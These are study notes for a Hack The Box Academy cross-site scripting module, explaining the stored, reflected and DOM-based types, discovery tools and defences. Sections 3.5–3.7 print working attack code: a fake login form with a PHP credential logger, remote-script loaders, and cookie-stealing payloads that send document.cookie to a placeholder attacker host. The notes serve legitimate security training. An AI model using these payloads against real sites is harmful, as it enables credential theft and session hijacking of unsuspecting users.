---
tags: [htb-academy, web-pentest, xss, revision]
module: Cross-Site Scripting (XSS)
---

# Cross-Site Scripting (XSS): Revision Notes

> **Legend:** Unmarked = from your module text. **(Extra)** = my own added explanation or example. **⚠ Verify** = unclear or inconsistent in the source.
> **Authorization:** Only test XSS and run phishing/cookie-stealing exercises against systems you are explicitly authorized to test. These are intrusive, real attack techniques.
> **Assessment note:** No flags or assessment answers are included. Section 6 gives approach only.

---

## 1. Main Concepts: What, Why, How

### 1.1 What is XSS

- **What:** A vulnerability that lets an attacker "write" and execute JavaScript on a page because the app doesn't properly sanitize user input.
- **Why it matters:**
  - XSS only executes **client-side**; it doesn't directly affect the back-end server and only affects the user who executes it.
  - Despite low direct impact, XSS is **very common** → low impact + high probability = **medium risk** (per the module's risk-matrix framing). Still worth detecting, remediating and preventing.
- **How it happens:** A web app sends HTML from the server to render in the browser. If user input (e.g. a comment) isn't sanitized, an attacker can inject extra JavaScript that other users unknowingly execute when they view the page.
- **Scope of impact:**
  - Limited to the browser's JS engine (e.g. V8 in Chrome); can't do system-wide code execution by itself.
  - In modern browsers, limited to the **same domain** as the vulnerable site.
  - **Exception:** combined with a **binary browser vulnerability** (e.g. a heap overflow), XSS can be the delivery mechanism for a JS exploit that breaks out of the browser sandbox and executes code on the machine.
- **Real-world examples (source):**
  - **Samy Worm (MySpace, 2005):** stored XSS worm; posted "Samy is my hero" and re-posted itself when viewed; over a million users affected in a day.
  - **TweetDeck (Twitter, 2014):** XSS created a self-retweeting tweet, retweeted 38,000+ times in under two minutes; Twitter had to shut TweetDeck down temporarily.
  - Google's search bar and the Apache Server have also had XSS vulnerabilities (Apache's was used to steal passwords).

### 1.2 The Three Types of XSS

| Type | What happens | Persistent? | Reaches back-end? | Example |
|---|---|---|---|---|
| **Stored (Persistent)** | Input is stored in the back-end DB and displayed on retrieval | Yes — affects any visitor | Yes | A comment/post containing a payload |
| **Reflected (Non-Persistent)** | Input is processed by the back-end and returned without being stored | No — temporary, per request | Yes | A search result or error message echoing input |
| **DOM-based (Non-Persistent)** | Input is shown directly via client-side JS, never reaching the back-end | No | No | A URL fragment (`#...`) processed in-browser |

- **Why Stored is most critical:** It affects a much wider audience (anyone who visits) and may be hard to remove (requires deleting it from the back-end DB).
- **Why Non-Persistent attacks still work:** You target a specific victim by sending them a crafted URL/request; it only fires for them, not for everyone.

### 1.3 Stored XSS — Walkthrough

- **What:** Payload is saved server-side and re-served to every visitor.
- **How (from the module's To-Do list exercise):**
  1. Submit input (e.g. `test`) and see if it's reflected back unfiltered.
  2. Try a basic payload: `<script>alert(window.origin)</script>`.
  3. If an alert pops up with the page's own origin, the payload executed.
  4. Confirm with page source (`CTRL+U`) — the payload should appear verbatim.
  5. **Refresh the page.** If the alert fires again, the payload is stored (Persistent).
- **Why `window.origin` instead of a static value like `1`:** Some apps load forms via cross-domain iframes. A vulnerable iframe's form wouldn't actually be a vulnerability on the main app. Showing `window.origin` confirms exactly which origin the payload executed on.
- **Fallback payloads if `alert()` is blocked by the browser:**
  - `<plaintext>` — stops HTML rendering after it and shows the rest as plaintext.
  - `<script>print()</script>` — opens the browser's print dialog; unlikely to be blocked.

### 1.4 Reflected XSS — Walkthrough

- **What:** Input is echoed back by the back-end without being stored. Not persistent across refreshes.
- **Why it's still dangerous:** You don't need it to persist — you need the victim to **visit a crafted URL/request once**.
- **How (from the module's example):**
  1. Submit input that appears in an error/confirmation message (e.g. "Task 'test' could not be added.").
  2. Try the basic payload in that field.
  3. If it fires, confirm via page source — payload appears in the error message.
  4. Check **which HTTP method** sent your input (Firefox DevTools, `CTRL+SHIFT+I` → Network tab).
  5. **GET requests** put parameters in the URL → you can simply share a crafted URL with the victim.
     Example: `http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>`
- **Getting the URL:** Copy from the address bar after submitting, or right-click the GET request in the Network tab → Copy → Copy URL.

### 1.5 DOM-based XSS — Walkthrough

- **What:** Input is processed entirely client-side via JavaScript manipulating the DOM; it never reaches the back-end.
- **How to recognise it:**
  - No HTTP requests fire in the Network tab when you submit input.
  - The URL uses a **hashtag `#`** for the parameter (a client-side-only fragment).
  - `CTRL+U` (raw page source) does **not** show your input, because JS updates the DOM *after* the page source was fetched.
  - `CTRL+SHIFT+C` (Web Inspector / rendered DOM) **does** show your input.
- **Source and Sink (core DOM XSS concept):**
  - **Source:** the JS object/input that takes user input (URL parameter, input field, etc.).
  - **Sink:** the function that writes that input into a DOM object. If the sink doesn't sanitize, it's vulnerable.
  - **Common vulnerable sink functions:**
    - `document.write()`
    - `DOM.innerHTML`
    - `DOM.outerHTML`
    - jQuery: `add()`, `after()`, `append()`
- **Example from source (`script.js`):**
  ```javascript
  var pos = document.URL.indexOf("task=");
  var task = document.URL.substring(pos + 5, document.URL.length);
  document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
  ```
  The Source is the `task=` URL parameter; the Sink is `innerHTML`, written without sanitization.
- **Why `<script>` tags may fail here:** `innerHTML` doesn't execute `<script>` content as a security feature. Use payloads that don't rely on `<script>`, e.g.:
  ```html
  <img src="" onerror=alert(window.origin)>
  ```
  An empty `src` always fails to load, triggering `onerror`, which runs the JS.

### 1.6 XSS Discovery

- **What:** Finding where XSS exists before exploiting it.
- **Automated discovery:**
  - Web Application Vulnerability Scanners (Nessus, Burp Pro, ZAP) do two scan types:
    - **Passive scan:** reviews client-side code for potential DOM-based issues.
    - **Active scan:** sends payloads to try to trigger XSS via injection.
  - Paid tools are usually more accurate (especially for bypassing security measures).
  - Open-source tools: **XSStrike**, **BruteXSS**, **XSSer**. They find input fields, send payloads, and compare the rendered output — but results must always be **manually verified**.
- **Manual discovery:**
  - Test payload lists (e.g. PayloadAllTheThings, Payload-Box) one by one against input fields.
  - XSS isn't limited to form fields — also check HTTP **headers** like `Cookie` or `User-Agent` if their values are ever displayed back.
  - Most generic payloads won't work out of the box, because they target different injection contexts (after a quote, inside an attribute, inside `<img>`, inside CSS) or are built to bypass specific sanitization filters.
  - Manually pasting payloads one by one is inefficient; writing a custom Python script to send/compare payloads is more efficient for advanced cases (**out of scope of this module**, per source).
- **Code review:** The most reliable method — review both back-end and front-end code to understand exactly how input flows to output, letting you craft a payload with high confidence. Advanced technique, out of scope here (source points to Secure Coding 101: JavaScript and Whitebox Pentesting 101: Command Injection for depth).

---

## 2. Important Terminology

| Term | Short definition |
|---|---|
| **XSS** | Injecting and executing JavaScript in a victim's browser via unsanitized input |
| **Stored/Persistent XSS** | Payload saved server-side, served to every visitor |
| **Reflected/Non-Persistent XSS** | Payload echoed back by the server, not stored |
| **DOM-based XSS** | Payload processed entirely client-side, never reaching the server |
| **Source** | The input point feeding user data into JS (URL param, input field) |
| **Sink** | The function that writes that data into the DOM |
| **`window.origin`** | JS property giving the current page's origin; used in test payloads to confirm which form/domain executed |
| **Blind XSS** | XSS triggered on a page you don't have access to (e.g. an admin panel) |
| **Defacing** | Changing a site's visible appearance to claim compromise |
| **Phishing (XSS context)** | Injecting a fake login form that sends credentials to the attacker |
| **Session hijacking / Cookie stealing** | Stealing a victim's session cookie to impersonate them without credentials |
| **WAF** | Web Application Firewall; detects/blocks injection attempts |
| **DOMPurify** | A JS library that sanitizes/escapes input to prevent injected HTML/JS |
| **Output encoding** | Converting special characters to HTML entities (e.g. `<` → `&lt;`) so they display but don't execute |
| **CSP (Content-Security-Policy)** | HTTP header restricting what scripts/resources a page may load/run |
| **HttpOnly cookie flag** | Prevents JavaScript from reading a cookie |
| **Secure cookie flag** | Cookie is only sent over HTTPS |
| **X-Content-Type-Options: nosniff** | Prevents browsers from MIME-sniffing content as a different type |

---

## 3. Commands and Tools

### 3.1 Testing Payloads (copy into vulnerable input fields)

| Payload | Purpose |
|---|---|
| `<script>alert(window.origin)</script>` | Primary test payload; alert shows the origin it executed on |
| `<plaintext>` | Fallback if `alert()` is blocked; stops HTML rendering after it |
| `<script>print()</script>` | Fallback; opens the print dialog, rarely blocked |
| `<img src="" onerror=alert(window.origin)>` | Works where `<script>` tags are stripped (e.g. via `innerHTML`) |

### 3.2 Browser DevTools Actions

| Action | Shortcut | Purpose |
|---|---|---|
| View page source | `CTRL+U` | Confirm a payload appears verbatim in raw HTML |
| Open DevTools / Network tab | `CTRL+SHIFT+I` | See which HTTP method (GET/POST) carried your input |
| Open Web Inspector (rendered DOM) | `CTRL+SHIFT+C` | See the DOM *after* JS has run (needed for DOM XSS, since raw source won't show it); also used as the element picker to find an element's `id` |
| Open Storage tab (cookies) | `Shift+F9` (Firefox) | View/add cookies manually, e.g. to use a stolen session cookie |

### 3.3 XSStrike (automated discovery tool)

**Install**
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```
- **Purpose:** Automatically test a parameter for XSS.

**Run against a parameter**
```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```
- **Flag:** `-u` = target URL including the parameter to test.
- **How it works:** Checks for DOM vulnerabilities, checks WAF status, tests the parameter, analyses reflections, generates payloads, and reports an efficient payload with a confidence score.
- **Expected result (per source example):** Output like a WAF status line, number of payloads generated, and a suggested payload (e.g. `<HtMl%09onPoIntERENTER+=+confirm()>`) with efficiency/confidence scores.
- **When to use:** Quick automated pass before manual verification. Always verify any reported finding manually.
- **Other tools mentioned (same idea, not detailed):** BruteXSS, XSSer.

### 3.4 Defacing Payloads

| Goal | Payload |
|---|---|
| Change background color | `<script>document.body.style.background = "#141d2b"</script>` |
| Change background image | `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` |
| Change page title | `<script>document.title = 'HackTheBox Academy'</script>` |
| Change text of one element | `document.getElementById("todo").innerHTML = "New Text"` |
| Change text of one element (jQuery) | `$("#todo").html('New Text');` (requires jQuery loaded on the page) |
| Replace the entire page body | `document.getElementsByTagName('body')[0].innerHTML = "New Text"` |

- **Why these four elements matter:** Background color (`document.body.style.background`), Background image (`document.body.background`), Page Title (`document.title`), Page Text (`DOM.innerHTML`) are the four typically used to change a page's main look.
- **Practical tip from source:** Prepare your replacement HTML locally and test it before committing, then minify it to one line and embed it inside the `innerHTML` payload.
- **Example full defacement payload (from source):**
  ```html
  <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
  ```
- **Note:** Multiple payloads appear in page order; an injected payload's position affects what may render after it, so account for later elements if your injection isn't at the end.

### 3.5 Phishing: Fake Login Form

**Basic login form HTML**
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
- `OUR_IP` = your VM's IP (find it with `ip a`, under `tun0` for the HTB VPN interface).

**Inject it via `document.write()`**
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
- **Purpose:** Writes the fake form into the vulnerable page via a Reflected XSS payload (e.g. in a URL parameter).

**Remove the original form (to make the fake one convincing)**
```javascript
document.getElementById('urlform').remove();
```
- Find the target element's `id` with the Page Inspector Picker (`CTRL+SHIFT+C`), then click the element.
- Combine after the `document.write(...)` call in the same payload.

**Hide leftover original HTML**
```html
...PAYLOAD... <!--
```
- Opens an HTML comment after your payload, commenting out what remains of the original source.

**Listener: quick check with netcat**
```bash
sudo nc -lvnp 80
```
- **Purpose:** Confirm the form submits somewhere; see the raw HTTP request.
- **Flags:** `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p` port.
- **Limitation:** netcat doesn't respond properly to HTTP, so the victim will see a connection error — may raise suspicion.

**Proper listener: PHP dev server + credential logger**
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php   # write the PHP script below
sudo php -S 0.0.0.0:80
```
- `-S 0.0.0.0:80` = start PHP's built-in server bound to all interfaces on port 80.

**`index.php` (credential logger, redirects victim back to the real page)**
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
- **Purpose:** Logs submitted credentials to `creds.txt` and redirects the victim back to the legitimate page, reducing suspicion.
- **Expected result:** `cat creds.txt` shows lines like `Username: test | Password: test`.

### 3.6 Blind XSS Detection (Remote Script Loading)

**Concept**
```html
<script src="http://OUR_IP/script.js"></script>
```
- Loading a remote script lets you detect execution on a page you can't see (e.g. an admin panel), since a request to your server confirms the payload ran.

**Naming the request by field (to identify which input is vulnerable)**
```html
<script src="http://OUR_IP/username"></script>
```
- If `/username` is requested on your server, the `username` field is vulnerable.

**Example payload variants (from PayloadsAllTheThings, per source)**
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
- **Why several variants:** Different injection contexts (plain, after a single quote, after a double quote, etc.) need different prefixes to break out of the surrounding markup correctly.
- **Practical tips from source:**
  - Skip fields with strict format validation enforced both front- and back-end (e.g. email).
  - Skip password fields (usually hashed, not reflected in cleartext).
  - Blind XSS has a higher success rate against **DOM XSS**, since source code access lets you craft a precise payload.

**Listener for this step**
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

### 3.7 Session Hijacking (Cookie Stealing)

**JavaScript payloads to exfiltrate the cookie (PayloadsAllTheThings, per source)**
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
- The module prefers the **second** (`new Image().src=...`): it just adds an image element, which looks less suspicious than a full page redirect.

**Host it as a remote script**
```html
<script src=http://OUR_IP/script.js></script>
```
where `script.js` contains:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

**Cookie-logging `index.php`**
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
- **Purpose:** Splits multiple cookies on `;`, URL-decodes each, and logs them with the victim's IP to `cookies.txt`.
- **Expected result (from source example):**
  ```
  10.10.10.10:52798 [200]: /script.js
  10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
  ```
  and `cookies.txt` containing a line like `Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2`.

**Using the stolen cookie**
1. Navigate to the target login page.
2. `Shift+F9` in Firefox to open the Storage bar.
3. Click **+** to add a cookie: Name = part before `=`, Value = part after `=`.
4. Refresh — you're now authenticated as the victim.

---

## 4. Practical Workflow

1. **Confirm authorization and scope.**
2. **Map input points:** form fields, URL parameters, and HTTP headers (Cookie, User-Agent) that get reflected anywhere.
3. **Probe with a basic payload:** `<script>alert(window.origin)</script>`.
   - If blocked, try `<plaintext>` or `<script>print()</script>`.
4. **Classify the XSS:**
   - Refresh the page. Fires again → **Stored**.
   - Fires once, tied to a GET/POST request → **Reflected**.
   - No HTTP request at all, `#` in the URL, payload missing from raw source but present in the rendered DOM → **DOM-based**.
5. **For DOM XSS, identify Source and Sink** in the client-side JS. Check whether the sink allows `<script>`; if not, use attribute-event payloads like `<img src="" onerror=...>`.
6. **If payloads don't fire (Blind XSS):** inject remote-script payloads named per field, with a listener running, to identify the vulnerable field without seeing the output.
7. **Pick the exploitation goal:**
   - **Defacing:** background, title, and body text payloads.
   - **Phishing:** inject a fake login form, remove the original form/fields, comment out leftovers, host a credential logger.
   - **Session hijacking:** exfiltrate `document.cookie` via a remote script and logger, then replay the cookie in the browser's storage.
8. **Set up infrastructure:** PHP dev server (`php -S 0.0.0.0:80`) is more reliable than plain netcat for HTTP interactions, since it returns proper responses and can run logging/redirect logic.
9. **Verify end to end:** trigger the payload yourself first, check logs/files, then use the real target flow (e.g. the stolen cookie on the login page).
10. **Recommend prevention** (see below) as part of the report.

### Common Mistakes
- Trusting a single payload list without adapting it to the injection context.
- Forgetting to check the Network tab, so a Reflected vs DOM classification is guessed rather than confirmed.
- Using `<script>` payloads against an `innerHTML` sink that strips them.
- Not accounting for element order when a stored payload isn't the last thing on the page.
- Leaving the original form/field visible during a phishing injection, undermining the pretext.
- Using netcat where a real HTTP response (redirect, success page) is needed to avoid raising suspicion.
- Testing every field in a Blind XSS scenario instead of skipping already-validated fields (e.g. strictly validated email, hashed passwords).
- Forgetting to replace `OUR_IP`/`SERVER_IP` placeholders in payloads and scripts.

### Troubleshooting
- **Alert doesn't fire:** try `<plaintext>` or `<script>print()</script>`; check if `<script>` tags are stripped by the sink.
- **Payload appears in source but doesn't execute:** likely encoded/escaped by the sink; try an attribute-based payload (`onerror`, etc.).
- **Blind XSS — nothing calls back:** try the next payload variant (different injection prefix); confirm the listener is actually running and reachable.
- **Victim gets "Unable to connect" on the fake login:** replace the netcat listener with a PHP server with proper request handling/redirect.
- **Can't tell which field is vulnerable:** use the remote-script-named-by-field trick.

---

## 5. XSS Prevention Reference

### 5.1 Front-end

| Measure | Example |
|---|---|
| **Input validation** | Regex checks (e.g. email format) before allowing submission |
| **Input sanitization** | DOMPurify: `let clean = DOMPurify.sanitize(dirty);` |
| **Avoid direct, unescaped input in:** | `<script>`, `<style>`, tag/attribute fields, HTML comments |
| **Avoid raw-HTML-writing functions with untrusted input:** | `DOM.innerHTML`, `DOM.outerHTML`, `document.write()`, `document.writeln()`, `document.domain`; jQuery `html()`, `parseHTML()`, `add()`, `append()`, `prepend()`, `after()`, `insertAfter()`, `before()`, `insertBefore()`, `replaceAll()`, `replaceWith()` |

- **Important caveat (source):** Front-end validation alone is not enough — it can be bypassed with custom GET/POST requests.

### 5.2 Back-end

| Measure | PHP example | NodeJS example |
|---|---|---|
| **Input validation** | `filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)` | Same regex approach as front-end |
| **Input sanitization** | `addslashes($_GET['email'])` | `DOMPurify.sanitize(dirty)` (imported server-side) |
| **Output HTML encoding** | `htmlentities($_GET['email'])` / `htmlspecialchars` | `html-entities` library, e.g. `encode('<') // '&lt;'` |

- **Why back-end matters most:** It's the layer that can't be bypassed by crafting custom requests, unlike front-end-only checks.

### 5.3 Server Configuration

- Use **HTTPS** across the entire domain.
- Use XSS-prevention headers.
- Use correct `Content-Type` with `X-Content-Type-Options: nosniff`.
- Use **Content-Security-Policy**, e.g. `script-src 'self'` (only locally hosted scripts allowed).
- Use **HttpOnly** (JS can't read the cookie) and **Secure** (HTTPS-only transport) cookie flags.
- A good **WAF** can automatically detect and reject injection attempts.
- Some frameworks have built-in XSS protection (e.g. **ASP.NET**, per source).

---

## 6. Quick Revision Sheet

### 6.1 Top 10 Things to Remember
1. XSS = injecting/executing JS client-side via unsanitized input; low direct server impact but high probability → medium risk overall.
2. Three types: **Stored** (DB, affects everyone, persistent), **Reflected** (echoed, not stored, per-request), **DOM-based** (client-side only, never reaches the server).
3. Classic test payload: `<script>alert(window.origin)</script>`; fallback: `<plaintext>`, `<script>print()</script>`.
4. `window.origin` confirms which origin executed the payload, important when iframes are in play.
5. DOM XSS hinges on **Source** (where input comes from) and **Sink** (where it's written, e.g. `innerHTML`); `<script>` may be stripped by sinks, so use `<img src="" onerror=...>` style payloads.
6. Reflected XSS via GET → share a crafted URL with the victim.
7. Blind XSS: use remote scripts named per field to find the vulnerable input without seeing the output; works best against DOM XSS.
8. Exploitation categories: **Defacing** (title/background/body), **Phishing** (fake login form, remove originals, comment out leftovers), **Session hijacking** (exfiltrate `document.cookie`, replay it).
9. Use a real HTTP listener (PHP dev server) rather than plain netcat when the victim needs a believable response.
10. Prevention = sanitize + validate on both front-end and back-end, encode output, and harden with CSP, HttpOnly/Secure cookies, HTTPS, and a WAF.

### 6.2 Compact Payload/Command Reference

| Task | Payload / Command |
|---|---|
| Basic XSS test | `<script>alert(window.origin)</script>` |
| Fallback test 1 | `<plaintext>` |
| Fallback test 2 | `<script>print()</script>` |
| Non-script sink payload | `<img src="" onerror=alert(window.origin)>` |
| Deface background | `document.body.style.background = "#141d2b"` |
| Deface title | `document.title = 'TEXT'` |
| Deface body | `document.getElementsByTagName('body')[0].innerHTML = 'HTML'` |
| Remove an element | `document.getElementById('ID').remove();` |
| Comment out leftover HTML | `...PAYLOAD... <!--` |
| Remote script load | `<script src=http://OUR_IP/script.js></script>` |
| Steal cookie | `new Image().src='http://OUR_IP/index.php?c='+document.cookie;` |
| netcat listener | `sudo nc -lvnp 80` |
| PHP listener | `sudo php -S 0.0.0.0:80` |
| Find your IP | `ip a` (look at `tun0`) |

### 6.3 Common Mistakes to Avoid
- Assuming front-end validation is sufficient.
- Using `<script>` payloads against sinks that strip them.
- Skipping the Network tab check (Reflected vs DOM confusion).
- Testing every field blindly instead of skipping clearly-validated ones.
- Using netcat where a believable HTTP response is required.
- Forgetting to swap in your actual IP/server values in payloads.

### 6.4 Revision Questions

1. **Why is XSS rated medium risk despite low direct server impact?**
   Low impact but very high probability of occurring (low impact + high probability = medium risk).
2. **What's the key test for whether an XSS vulnerability is Stored?**
   Refresh the page; if the payload executes again without resubmitting it, it's stored/persistent.
3. **How do you tell Reflected XSS from DOM-based XSS?**
   Check the Network tab: Reflected makes an HTTP request with your input; DOM-based makes none, and input only appears in the rendered DOM, not the raw page source.
4. **What are Source and Sink in DOM XSS?**
   Source = where user input enters the JS (e.g. a URL parameter); Sink = the function that writes it into the DOM (e.g. `innerHTML`).
5. **Why might `<script>` payloads fail against an `innerHTML` sink?**
   `innerHTML` doesn't execute injected `<script>` tags as a browser security feature; use event-attribute payloads instead.
6. **How do you find which input field is vulnerable in a Blind XSS scenario?**
   Inject a remote-script payload per field, naming the requested path after the field, and see which request arrives at your listener.
7. **Why prefer `new Image().src=...` over `document.location=...` for cookie stealing?**
   It just adds an image element rather than navigating away, so it looks less suspicious to the victim.
8. **Why use a PHP dev server instead of plain netcat for phishing/cookie theft?**
   netcat can't return a proper HTTP response, so the victim sees a connection error; PHP can log data and redirect them back convincingly.
9. **Name three front-end functions/APIs to avoid using with raw user input.**
   `innerHTML`, `outerHTML`, `document.write()` (also `document.writeln()`, `document.domain`, or jQuery's `html()`/`append()`/etc.).
10. **Name three back-end/server-level XSS defenses besides sanitization.**
    Output encoding (`htmlentities`), Content-Security-Policy (`script-src 'self'`), HttpOnly/Secure cookie flags, HTTPS, and a WAF.

### 6.5 Two-Minute Final Summary

XSS lets an attacker run JavaScript in a victim's browser because input isn't sanitized. It's client-side only and same-domain limited, but it's extremely common, so it's rated medium risk. There are three types: Stored (saved server-side, hits every visitor, test by refreshing), Reflected (echoed back once, test by checking the HTTP method/Network tab and sharing a crafted GET URL), and DOM-based (purely client-side — check for a Source feeding an unsanitized Sink like `innerHTML`, and note that `<script>` tags may be stripped so attribute-event payloads like `<img onerror=...>` are needed).

Discovery starts with the classic `<script>alert(window.origin)</script>` payload (with `<plaintext>`/`print()` as fallbacks), moves to automated scanners (XSStrike, BruteXSS, XSSer, or commercial tools) for coverage, and finishes with manual verification and, for serious work, code review. Blind XSS (payload fires somewhere you can't see, like an admin panel) is detected by loading a remote script named per field and watching which request arrives at your listener.

Exploitation covers defacing (background/title/body via a handful of JS one-liners), phishing (inject a fake login form, remove the real one, comment out leftovers, log credentials with a proper PHP listener), and session hijacking (exfiltrate `document.cookie` via a remote script, log it server-side, then paste it into the browser's cookie storage to take over the session).

Prevention is layered: validate and sanitize input on both front-end and back-end (DOMPurify, regex, `addslashes`), encode output (`htmlentities`, `html-entities`), avoid raw-HTML-writing functions with untrusted input, and harden the server with HTTPS, CSP, HttpOnly/Secure cookies, and a WAF.

---

## 7. Skills Assessment: Approach Only

The assessment asks you to find a vulnerable field on a Security Blog app, get a working XSS payload executing, and use session-hijacking techniques to steal a cookie containing a flag. These notes contain no answers. Use the workflow in §4: discover → classify → pick exploitation technique (session hijacking, per §3.7) → verify.
